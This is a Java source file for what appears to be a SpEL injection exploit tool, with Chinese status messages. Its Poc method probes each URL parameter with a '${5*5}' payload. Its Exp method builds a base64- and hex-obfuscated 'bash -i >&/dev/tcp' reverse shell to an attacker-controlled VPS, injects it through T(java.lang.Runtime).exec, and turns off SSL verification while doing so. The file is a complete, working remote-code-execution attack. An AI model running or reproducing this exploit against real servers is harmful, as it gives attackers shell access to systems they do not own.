package src.main.module;

import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class SpelRCE {
    private String address;
    private String vpsIP;
    private String vpsPORT;
    public String pocData = "\\${5*5}";
    public String text = "";
    public static String cmdtmp ="bash -i >&/dev/tcp/%s/%s 0>&1";
//    bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS85MDAwIDA+JjE=}|{base64,-d}|{bash,-i}
    public static String cmd = "bash -c {echo,%s}|{base64,-d}|{bash,-i}";
    public String expDatatemp = "\\${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{%s}))}";

    public SpelRCE(String address, String vpsIP, String vpsPORT) {
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
    }

    // 用正则匹配 URL 中的参数并替换为注入值
    private String replaceInjectionPoints(String url, String paramName, String payload) {
        // 匹配目标参数名和值
        String regex = "(" + paramName + "=)([^&]*)";
        return url.replaceAll(regex, "$1" + payload);
    }

    // 提取 URL 中所有的参数名称
    private String[] extractParamNames(String url) {
        Pattern pattern = Pattern.compile("[?&]([^=&]+)=");
        Matcher matcher = pattern.matcher(url);
        StringBuilder params = new StringBuilder();
        while (matcher.find()) {
            params.append(matcher.group(1)).append(",");
        }
        return params.toString().split(",");
    }

    public void Exp(ResultCallback callback) throws IOException {
        disableSSLVerification();
        String b64payload = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,vpsPORT).getBytes());

        String cmdtemp = String.format(cmd,b64payload);
        byte[] bytes = cmdtemp.getBytes(StandardCharsets.UTF_8);
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("0x%02x,", b));
        }
        if (hexString.length() > 0) {
            hexString.setLength(hexString.length() - 1);
        }
        String expdata = String.format(expDatatemp,hexString.toString());
        String encodedExpData = URLEncoder.encode(expdata, StandardCharsets.UTF_8.toString());
        String updatedUrl = address +  "=" + encodedExpData;

            try {
                URL obj = new URL(updatedUrl);
                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                conn.setRequestMethod("GET");
                conn.setDoOutput(true);
                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR) { // 500 错误
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
//                    java.lang.UNIXProcess
                    if (response.toString().contains("java.lang.UNIXProcess")){
                        text = "命令执行成功，请在vps上查看信息";
                        callback.onResult(text);
                        text = "当前监听vpsIP： " + vpsIP + "监听端口: " + vpsPORT;
                        callback.onResult(text);
                    }else{
                        text = "命令执行失败， " + "未知状态码";
                        callback.onResult(text);
                    }
                }else{
                    text = "命令执行失败";
                    callback.onResult(text);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
//        }

    }

    public void Poc(ResultCallback callback) throws IOException {
        disableSSLVerification();
        String[] paramNames = extractParamNames(address);

        for (String paramName : paramNames) {
            if (paramName.isEmpty()){
                text = "参数名为空，请确认再重试";
                callback.onResult(text);
            }
            String updatedUrl = replaceInjectionPoints(address, paramName, pocData);
            try {
                URL obj = new URL(updatedUrl);
                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                conn.setRequestMethod("GET");
                conn.setDoOutput(true);
                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR) { // 500 错误
                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    if (response.toString().contains("25")) {
                        text = "可能存在Spel注入漏洞，请用getshell模块" + "注入参数为: " + paramName;
                        callback.onResult(text);
                    } else {
                        text = "参数为" + " " +  paramName + " " + "未发现Spel注入漏洞";
                        callback.onResult(text);
                    }
                } else {
                    text = "未知状态码: " + responseCode;
                    callback.onResult(text);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}